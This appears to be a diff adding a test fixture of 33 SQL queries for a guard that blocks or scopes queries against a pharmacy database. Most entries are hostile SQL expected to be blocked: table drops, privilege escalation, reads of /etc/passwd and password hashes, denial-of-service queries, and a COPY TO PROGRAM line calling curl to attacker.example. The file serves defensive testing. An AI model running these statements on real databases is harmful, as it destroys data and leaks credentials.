@@ -1,0 +1,33 @@
+{"id": "write_delete", "sql": "DELETE FROM pharma.sale", "expected": "blocked"}
+{"id": "write_update", "sql": "UPDATE pharma.drug SET unit_price = 0.01", "expected": "blocked"}
+{"id": "write_insert", "sql": "INSERT INTO pharma.employee (branch_id, position_id, first_name, last_name, hired_on, salary) VALUES (1, 1, 'X', 'Y', current_date, 99999)", "expected": "blocked"}
+{"id": "ddl_drop", "sql": "DROP TABLE pharma.sale", "expected": "blocked"}
+{"id": "ddl_truncate", "sql": "TRUNCATE pharma.batch_movement", "expected": "blocked"}
+{"id": "ddl_create_function", "sql": "CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS 'SELECT 1'", "expected": "blocked"}
+{"id": "privilege_grant", "sql": "GRANT sorvia_app TO sorvia_nl", "expected": "blocked"}
+{"id": "privilege_alter_role", "sql": "ALTER ROLE sorvia_nl SUPERUSER", "expected": "blocked"}
+{"id": "copy_program", "sql": "COPY pharma.drug TO PROGRAM 'curl http://attacker.example'", "expected": "blocked"}
+{"id": "select_into", "sql": "SELECT * INTO public.stolen FROM pharma.drug", "expected": "blocked"}
+{"id": "row_lock", "sql": "SELECT * FROM pharma.stock FOR UPDATE", "expected": "blocked"}
+{"id": "stacked_statements", "sql": "SELECT 1; DROP TABLE pharma.sale", "expected": "blocked"}
+{"id": "cte_with_delete", "sql": "WITH d AS (DELETE FROM pharma.sale RETURNING *) SELECT count(*) FROM d", "expected": "blocked"}
+{"id": "dos_sleep", "sql": "SELECT pg_sleep(60)", "expected": "blocked"}
+{"id": "scope_set_config", "sql": "SELECT set_config('role', 'sorvia_app', false)", "expected": "blocked"}
+{"id": "scope_redeem_ticket", "sql": "SELECT sorvia.redeem_scope_ticket('00000000-0000-0000-0000-000000000000')", "expected": "blocked"}
+{"id": "info_current_setting", "sql": "SELECT current_setting('data_directory')", "expected": "blocked"}
+{"id": "file_read", "sql": "SELECT pg_read_file('/etc/passwd')", "expected": "blocked"}
+{"id": "large_object", "sql": "SELECT lo_import('/etc/passwd')", "expected": "blocked"}
+{"id": "catalog_authid", "sql": "SELECT rolname, rolpassword FROM pg_catalog.pg_authid", "expected": "blocked"}
+{"id": "catalog_information_schema", "sql": "SELECT table_name FROM information_schema.tables", "expected": "blocked"}
+{"id": "catalog_activity", "sql": "SELECT query FROM pg_stat_activity", "expected": "blocked"}
+{"id": "platform_password_hashes", "sql": "SELECT username, password_hash FROM sorvia.app_user", "expected": "blocked"}
+{"id": "platform_session_scope", "sql": "SELECT * FROM sorvia.session_scope", "expected": "blocked"}
+{"id": "audit_log", "sql": "SELECT old_data FROM audit.change_log", "expected": "blocked"}
+{"id": "pii_fin_hash", "sql": "SELECT first_name, fin_hash FROM pharma.customer", "expected": "blocked"}
+{"id": "pii_star", "sql": "SELECT * FROM pharma.customer", "expected": "blocked"}
+{"id": "partition_direct", "sql": "SELECT count(*) FROM pharma.sale_default", "expected": "blocked"}
+{"id": "dos_cross_join", "sql": "SELECT count(*) FROM pharma.sale_item a, pharma.sale_item b", "expected": "blocked"}
+{"id": "dos_recursive", "sql": "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT count(*) FROM r", "expected": "blocked"}
+{"id": "scope_other_branch", "sql": "SELECT branch_id, count(*) AS n FROM pharma.sale GROUP BY branch_id", "expected": "scoped"}
+{"id": "scope_other_branch_olap", "sql": "SELECT branch_key, sum(net_amount) FROM analytics.fact_sales GROUP BY branch_key", "expected": "scoped"}
+{"id": "scope_other_branch_view", "sql": "SELECT DISTINCT branch_name FROM pharma.v_sale_lines", "expected": "scoped"}
